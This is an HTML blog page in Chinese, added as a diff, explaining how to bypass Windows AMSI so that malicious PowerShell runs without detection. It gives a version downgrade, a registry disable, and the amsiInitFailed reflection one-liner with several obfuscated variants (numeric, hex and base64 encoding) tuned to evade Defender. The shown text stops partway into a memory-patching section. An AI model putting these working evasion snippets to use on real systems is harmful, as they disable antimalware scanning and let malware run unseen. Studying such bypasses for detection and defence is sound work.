@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="code-n4alrUzr1E" />
+    <meta name="description" content="关于AMSI当用户执行脚本或启动 PowerShell 时，AMSI.dll 被动态加载进入内存空间。在执行之前，防病毒软件使用以下两个 API 来扫描缓冲区和字符串以查找恶意软件的迹象。  AmsiScanBuffer()  AmsiScanString() amsi只是一个通道，真正检测出是否是恶意脚本的是杀软，比如defender，amsi和杀软的区别在于无论我们的恶意脚本是经过多次模糊处理">
+<meta property="og:type" content="article">
+<meta property="og:title" content="How to Bypass AMSI">
+<meta property="og:url" content="https://0range-x.github.io/2022/01/23/AMSI/index.html">
+<meta property="og:site_name" content="0r@nge の窝">
+<meta property="og:description" content="关于AMSI当用户执行脚本或启动 PowerShell 时，AMSI.dll 被动态加载进入内存空间。在执行之前，防病毒软件使用以下两个 API 来扫描缓冲区和字符串以查找恶意软件的迹象。  AmsiScanBuffer()  AmsiScanString() amsi只是一个通道，真正检测出是否是恶意脚本的是杀软，比如defender，amsi和杀软的区别在于无论我们的恶意脚本是经过多次模糊处理">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220104002756500.png">
+<meta property="og:image" content="https://0range-x.github.io/AMSI/image-20220110210452843.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103150817054.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103145525344.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103154159362.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103160024995.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103145806943.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103162358415.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220102235440814.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103165241214.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103165703332.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103165808764.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220103170440557.png">
+<meta property="og:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220105004129848.png">
+<meta property="article:published_time" content="2022-01-22T16:19:10.000Z">
+<meta property="article:modified_time" content="2022-02-15T14:39:56.430Z">
+<meta property="article:author" content="0r@nge">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="AMSI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0range-x.github.io/2022/01/23/AMSI/image-20220104002756500.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icon.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>How to Bypass AMSI</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="0r@nge の窝" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links">Links</a></li><!--
+     --><!--
+       --><li><a href="/atom.xml">RSS</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/01/26/Domain-penetration_one-stop/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/01/10/%E6%B5%85%E6%9E%90%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2022/01/23/AMSI/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2022/01/23/AMSI/&text=How to Bypass AMSI"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2022/01/23/AMSI/&is_video=false&description=How to Bypass AMSI"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=How to Bypass AMSI&body=Check out this article: https://0range-x.github.io/2022/01/23/AMSI/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2022/01/23/AMSI/&title=How to Bypass AMSI"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2022/01/23/AMSI/&name=How to Bypass AMSI&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2022/01/23/AMSI/&t=How to Bypass AMSI"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EAMSI"><span class="toc-number">1.</span> <span class="toc-text">关于AMSI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AMSI%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">AMSI的调用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%B5%81%E5%AF%B9%E6%8A%97"><span class="toc-number">2.</span> <span class="toc-text">主流对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%99%8D%E7%BA%A7"><span class="toc-number">2.1.</span> <span class="toc-text">1.降级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8B%86%E5%88%86"><span class="toc-number">2.2.</span> <span class="toc-text">2.拆分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%A6%81%E7%94%A8AMSI"><span class="toc-number">2.3.</span> <span class="toc-text">3.改注册表禁用AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E4%B8%80%E9%94%AE%E5%85%B3%E9%97%ADAMSI"><span class="toc-number">2.4.</span> <span class="toc-text">4.一键关闭AMSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%86%85%E5%AD%98%E8%A1%A5%E4%B8%81"><span class="toc-number">2.5.</span> <span class="toc-text">5.内存补丁</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#demo"><span class="toc-number">2.5.1.</span> <span class="toc-text">demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E4%B8%BB%E6%B5%81%E5%AF%B9%E6%8A%97"><span class="toc-number">3.</span> <span class="toc-text">非主流对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8A%AB%E6%8C%81amsi-dll"><span class="toc-number">3.1.</span> <span class="toc-text">1.劫持amsi.dll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-NULL%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">2.NULL字符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-COM-server%E5%8A%AB%E6%8C%81"><span class="toc-number">3.3.</span> <span class="toc-text">3.COM server劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7"><span class="toc-number">4.</span> <span class="toc-text">Powershell 版本特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V2"><span class="toc-number">4.1.</span> <span class="toc-text">PowerShell V2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V3-V4"><span class="toc-number">4.2.</span> <span class="toc-text">PowerShell V3&#x2F;V4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V5"><span class="toc-number">4.3.</span> <span class="toc-text">PowerShell V5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V6"><span class="toc-number">4.4.</span> <span class="toc-text">PowerShell V6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-V7"><span class="toc-number">4.5.</span> <span class="toc-text">PowerShell V7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PowerShell-%E8%AE%B0%E5%BD%95%E5%8F%AF%E7%96%91%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">4.6.</span> <span class="toc-text">PowerShell 记录可疑字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        How to Bypass AMSI
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0r@nge</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-22T16:19:10.000Z" itemprop="datePublished">2022-01-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/AMSI/" rel="tag">AMSI</a>, <a class="tag-link-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a>
+    </div>
+
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="关于AMSI"><a href="#关于AMSI" class="headerlink" title="关于AMSI"></a>关于AMSI</h2><p>当用户执行脚本或启动 PowerShell 时，AMSI.dll 被动态加载进入内存空间。在执行之前，防病毒软件使用以下两个 API 来扫描缓冲区和字符串以查找恶意软件的迹象。<br>  AmsiScanBuffer()<br>  AmsiScanString()</p>
+<p>amsi只是一个通道，真正检测出是否是恶意脚本的是杀软，比如defender，amsi和杀软的区别在于无论我们的恶意脚本是经过多次模糊处理还是远程执行，amsi都可以在脚本注入内存前检测到。而普通的静态杀毒软件是没办法的。</p>
+<p>其实不难理解，首先我们要知道我们的恶意脚本是如何注入内存执行的<br>bypass 杀毒软件时我们的脚本一定是模糊处理的，但是无论我们什么样模糊处理到注入内存执行的时候一定是纯净，清晰的代码，不然脚本引擎无法理解和执行我们的恶意脚本。那么问题就是在这里，amsi在脚本解密到注入内存之前去扫描查杀。这才是调用amsi的意义。</p>
+<p>​    </p>
+<p>amsi是所有杀毒软件都可以调用吗？并不是！<br>amsi是在Windows 10 和Windows Server 2016 之后才有的，然后并不是所有的杀毒软件都可以调用amsi接口。国内的基本都不可以。<br>在github上有一个项目记录了可以调用amsi的杀毒软件</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/subat0mik/whoamsi/">https://github.com/subat0mik/whoamsi/</a></p>
+<p>查看amsi中的查杀结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-WinEvent &#x27;microssoft-windows-windows defender/operational&#x27; | Where-Object id -EQ 1116 | format-list</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/23/AMSI/image-20220104002756500.png" alt="image-20220104002756500"></p>
+<h3 id="AMSI的调用"><a href="#AMSI的调用" class="headerlink" title="AMSI的调用"></a>AMSI的调用</h3><p>下图为AMSI的扫描过程</p>
+<p><img src="/AMSI/image-20220110210452843.png" alt="image-20220110210452843"></p>
+<p>可以成为Windows的组件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.用户账户控制，也就是UAC（EXE、COM、MSI、ActiveX的安装） </span><br><span class="line">	%windir%\System32\consent.exe</span><br><span class="line">2.Powershell（脚本、交互式使用、动态代码求值）</span><br><span class="line">	System.Management.Automation.dll</span><br><span class="line">3.Windows脚本宿主</span><br><span class="line">    wscript.exe</span><br><span class="line">    cscript.exe</span><br><span class="line">4.JavaScript、VBScript</span><br><span class="line">    %windir%\System32\jscript.dll</span><br><span class="line">    %windir%\System32\vbscript.dll</span><br><span class="line">5.Office VBA macros(宏)</span><br><span class="line">	VBE7.dll</span><br><span class="line">6 .NET Assembly</span><br><span class="line">	clr.dll</span><br><span class="line">7.WMI</span><br><span class="line">	%windir%\System32\wbem\fastprox.dll</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>　</p>
+<h2 id="主流对抗"><a href="#主流对抗" class="headerlink" title="主流对抗"></a>主流对抗</h2><h3 id="1-降级"><a href="#1-降级" class="headerlink" title="1.降级"></a>1.降级</h3><p>因为低版本(2.0)的powershell是没有amsi的，所以在powershell2.0上执行恶意脚本就不会被检测到</p>
+<p>下图是powershell在各个系统上的预装情况，可以看到现在常见的win10、Windows 2016、2019很少预装有powershell2.0（amsi是从win10、2016开始存在的），但是由于很多服务需要低版本的powershell，所以在红蓝对抗中也会碰到装有powershell2.0 的机器。</p>
+<p><img src="/2022/01/23/AMSI/image-20220103150817054.png" alt="image-20220103150817054"></p>
+<p>查看当前powershell版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$PSVersionTable</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/23/AMSI/image-20220103145525344.png" alt="image-20220103145525344"></p>
+<p>判断能否使用powershell 2.0</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">注：非管理员权限</span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="string">&#x27;HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP&#x27;</span> <span class="literal">-recurse</span> | <span class="built_in">Get-ItemProperty</span> <span class="literal">-name</span> Version <span class="literal">-EA</span> <span class="number">0</span> | <span class="built_in">Where</span> &#123; <span class="variable">$_</span>.PSChildName <span class="operator">-match</span> <span class="string">&#x27;^(?!S)\p&#123;L&#125;&#x27;</span>&#125; | <span class="built_in">Select</span> <span class="literal">-ExpandProperty</span> Version</span><br><span class="line"></span><br><span class="line">注：需要管理员权限</span><br><span class="line">Win10：</span><br><span class="line"><span class="built_in">Get-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> MicrosoftWindowsPowerShellV2</span><br><span class="line"></span><br><span class="line">Win2016/Win2019</span><br><span class="line"><span class="built_in">Get-WindowsFeature</span> PowerShell<span class="literal">-V2</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>虚拟机上测试未安装低版本powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -version 2   //改变powershell运行版本</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/23/AMSI/image-20220103154159362.png" alt="image-20220103154159362"></p>
+<p>这里因为没有环境，我本机装有其他杀软，amsi不起作用，就不演示了</p>
+<p>如果在脚本中使用，在脚本开头加入 <code>#requires -version 2</code>，这样如果可以使用2.0，脚本会以2.0执行，如果不能，会按照当前powershell版本执行。当然并不是所有脚本都可以在低版本的powershell执行。 </p>
+<p>还有一点，用powershell3 /4/5都还是默认以当前版本的powershell来执行</p>
+<p><img src="/2022/01/23/AMSI/image-20220103160024995.png" alt="image-20220103160024995"></p>
+<p>另外vbscript/jscript不存在所谓降级攻击，因为在10/16/19并不存在像powershell一样的断代<br>情况</p>
+<h3 id="2-拆分"><a href="#2-拆分" class="headerlink" title="2.拆分"></a>2.拆分</h3><p><img src="/2022/01/23/AMSI/image-20220103145806943.png" alt="image-20220103145806943"></p>
+<h3 id="3-改注册表禁用AMSI"><a href="#3-改注册表禁用AMSI" class="headerlink" title="3.改注册表禁用AMSI"></a>3.改注册表禁用AMSI</h3><p>设置注册表<code>HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable</code>设置为 0，以禁用<br>AMSI。</p>
+<p>很奇怪，我在本机和虚拟机上都没有找到这一键值，估计是和系统型号有关</p>
+<p><img src="/2022/01/23/AMSI/image-20220103162358415.png" alt="image-20220103162358415"></p>
+<p>查阅多方资料，这个方法现在已经不能用了。</p>
+<h3 id="4-一键关闭AMSI"><a href="#4-一键关闭AMSI" class="headerlink" title="4.一键关闭AMSI"></a>4.一键关闭AMSI</h3><p>使用一行命令关闭amsi，但是现在被加黑了</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="string">&#x27;amsiInitFailed&#x27;</span>,<span class="string">&#x27;NonPubilc,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/01/23/AMSI/image-20220102235440814.png" alt="image-20220102235440814"></p>
+<p>我们 可以一个个试  到底是哪里被杀了</p>
+<p><img src="/2022/01/23/AMSI/image-20220103165241214.png" alt="image-20220103165241214"></p>
+<p>单独检测下，可以看到 <code>AmsiUtils</code>和<code>AmsiInitFailed</code>被杀了</p>
+<p><img src="/2022/01/23/AMSI/image-20220103165703332.png" alt="image-20220103165703332"></p>
+<p><img src="/2022/01/23/AMSI/image-20220103165808764.png" alt="image-20220103165808764"></p>
+<p>那接下来的思路就很明确了，就是针对<code>AmsiUtils</code>和<code>AmsiInitFailed</code>这两个字符串进行处理了</p>
+<p>其实和混淆shellcode的方法差不多，先编码再解码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//System.Management.Automation.AmsiUtils和amsiInitFailed的编码数据</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;5492868772801748688168747280728187173688878280688776828&quot;</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;1173680867656877679866880867644817687416876797271&quot;</span></span><br><span class="line"></span><br><span class="line">//对System.Management.Automation.AmsiUtils进行解码</span><br><span class="line"><span class="variable">$c</span>=[<span class="built_in">string</span>](<span class="number">0</span>..<span class="number">37</span>|%&#123;[<span class="built_in">char</span>][<span class="built_in">int</span>](<span class="number">29</span>+(<span class="variable">$a</span>+<span class="variable">$b</span>).substring((<span class="variable">$_</span>*<span class="number">2</span>),<span class="number">2</span>))&#125;)<span class="operator">-replace</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="variable">$d</span>=[<span class="type">Ref</span>].Assembly.GetType(<span class="variable">$c</span>)</span><br><span class="line"></span><br><span class="line">//对amsiInitFailed进行解码</span><br><span class="line"><span class="variable">$e</span>=[<span class="built_in">string</span>](<span class="number">38</span>..<span class="number">51</span>|%&#123;[<span class="built_in">char</span>][<span class="built_in">int</span>](<span class="number">29</span>+(<span class="variable">$a</span>+<span class="variable">$b</span>).substring((<span class="variable">$_</span>*<span class="number">2</span>),<span class="number">2</span>))&#125;)<span class="operator">-replace</span> <span class="string">&quot; &quot;</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$d</span>.GetField(<span class="variable">$e</span>,<span class="string">&#x27;NonPublic,Static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">//组合起来执行</span><br><span class="line"><span class="variable">$f</span>.SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/23/AMSI/image-20220103170440557.png" alt="image-20220103170440557"></p>
+<p>其中混淆的关键点就是 编码解码 <code>[string](0..37|%&#123;[char][int](29+($a+$b).substring(($_*2),2))&#125;)-replace &quot; &quot;</code></p>
+<p>hex编码</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.&#x27;</span>+<span class="variable">$</span>(<span class="string">&quot;41 6D 73 69 55 74 69 6C 73&quot;</span>.Split(<span class="string">&quot; &quot;</span>)|<span class="keyword">forEach</span>&#123;[<span class="built_in">char</span>]([<span class="type">convert</span>]::toint16(<span class="variable">$_</span>,<span class="number">16</span>))&#125;|<span class="keyword">forEach</span>&#123;<span class="variable">$result</span>=<span class="variable">$result</span>+<span class="variable">$_</span>&#125;;<span class="variable">$result</span>)).GetField(<span class="variable">$</span>(<span class="string">&quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&quot;</span>.Split(<span class="string">&quot; &quot;</span>)|<span class="keyword">forEach</span>&#123;[<span class="built_in">char</span>]([<span class="type">convert</span>]::toint16(<span class="variable">$_</span>,<span class="number">16</span>))&#125;|<span class="keyword">forEach</span>&#123;<span class="variable">$result2</span>=<span class="variable">$result2</span>+<span class="variable">$_</span>&#125;;<span class="variable">$result2</span>),<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>下面的这种 base64亲测失效，虽然可以关掉amsi，但被defender查杀，会立刻结束掉当前powershell进程</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Ref</span>].Assembly.GetType(<span class="string">&#x27;System.Management.Automation.&#x27;</span>+<span class="variable">$</span>([<span class="type">Text.Encoding</span>]::Unicode.GetString([<span class="type">Convert</span>]::FromBase64String(<span class="string">&#x27;QQBtAHMAaQBVAHQAaQBsAHMA&#x27;</span>)))).GetField(<span class="variable">$</span>([<span class="type">Text.Encoding</span>]::Unicode.GetString([<span class="type">Convert</span>]::FromBase64String(<span class="string">&#x27;YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA==&#x27;</span>))),<span class="string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="variable">$null</span>,<span class="variable">$true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>更多的混淆办法去学习下powershell，了解语言本身才能产生更多骚思路</p>
+<h3 id="5-内存补丁"><a href="#5-内存补丁" class="headerlink" title="5.内存补丁"></a>5.内存补丁</h3><p>AMSI检测相关api的调用顺序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AmsiInitialize – 初始化AMSI API.</span><br><span class="line">AmsiOpenSession – 打开session</span><br><span class="line">AmsiScanBuffer – scans the user-input.</span><br><span class="line">AmsiCloseSession – 关闭session</span><br><span class="line">AmsiUninitialize – 删除AMSI API</span><br></pre></td></tr></table></figure>
+
+<p>因为amsi是基于字符串静态扫描的，用到的函数是 <code>AmsiScanBuffer</code>，我们是不是可以hook该函数，使其返回我们需要的值呢？理则是修改AmsiScanBuffer函数的参数值（两个思路，一个是修改扫描长度，另一个是修改返回值）</p>
+<p>看下<code>AmsiScanBuffer</code>的函数参数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">AmsiScanBuffer</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="params"><span class="function"> PVOID buffer,</span></span></span><br><span class="line"><span class="params"><span class="function"> ULONG length,</span></span></span><br><span class="line"><span class="params"><span class="function"> LPCWSTR contentName,</span></span></span><br><span class="line"><span class="params"><span class="function"> HAMSISESSION amsiSession,</span></span></span><br><span class="line"><span class="params"><span class="function"> AMSI_RESULT *result )</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>为了让amsi.dll 返回 <code>AMSI_RESULT_NOT_DETECTED</code>，这里的关注点是 <code>hResult</code>，即amsi.dll的返回值，只要它小于0，就可以bypass amsi。通过分析我们可以在<code>AmsiInitialize、AmsiOpenSession、AmsiScanBuffer</code>这3个函数中patch(补丁)都可以达到bypass amsi的效果.</p>
+<p>分析后，<code>AmsiInitializ</code>不可以利用，<code>AmsiOpenSession、AmsiScanBuffer</code>可以利用</p>
